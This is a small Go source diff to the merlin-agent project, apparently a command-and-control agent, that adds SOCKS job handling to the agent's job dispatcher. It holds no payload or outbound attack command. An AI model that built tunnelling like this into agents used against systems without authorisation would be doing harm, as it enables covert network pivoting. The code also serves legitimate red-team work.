@@ -29,6 +29,7 @@ import (
 	// Internal
 	"github.com/Ne0nd0g/merlin-agent/cli"
 	"github.com/Ne0nd0g/merlin-agent/commands"
+	"github.com/Ne0nd0g/merlin-agent/socks"
 )
 
 var jobsIn = make(chan jobs.Job, 100)  // A channel of input jobs for the agent to handle
@@ -177,6 +178,8 @@ func (a *Agent) jobHandler(Jobs []jobs.Job) {
 				jobsOut <- job
 			case jobs.RESULT:
 				jobsOut <- job
+			case jobs.SOCKS:
+				socks.Handler(job, &jobsOut)
 			default:
 				var result jobs.Results
 				result.Stderr = fmt.Sprintf("%s is not a valid job type", messages.String(job.Type))
